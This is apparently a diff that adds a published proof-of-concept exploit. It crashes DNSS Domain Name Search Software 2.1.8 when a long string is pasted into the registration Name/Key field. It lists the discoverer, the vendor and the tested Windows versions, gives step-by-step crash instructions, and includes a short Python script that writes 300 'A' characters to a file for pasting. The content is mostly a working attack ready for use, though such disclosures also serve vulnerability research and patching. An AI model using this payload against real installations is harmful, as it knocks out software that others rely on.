@@ -1,0 +1,22 @@
+#Exploit Title: DNSS Domain Name Search Software 2.1.8 -  Denial of Service (PoC)
+#Discovery by: Victor Mondragón
+#Discovery Date: 2019-05-12
+#Vendor Homepage: www.nsauditor.com 
+#Software Link: http://www.nsauditor.com/downloads/dnss_setup.exe
+#Tested Version: 2.1.8
+#Tested on: Windows Windows 10 Single Language x64 / 7 x64 Service Pack 1
+
+#Steps to produce the crash:
+#1.- Run python code: DNSS_2.1.8.py
+#2.- Open DNSS.txt and copy content to clipboard
+#3.- Open Dnss
+#4.- Select "Register" > "Enter Registration Code..."
+#5.- In "Name/Key" paste Clipboard
+#6.- Click "Ok"
+#7.- Crarshed
+ 
+cod = "\x41" * 300
+ 
+f = open('DNSS.txt', 'w')
+f.write(cod)
+f.close()
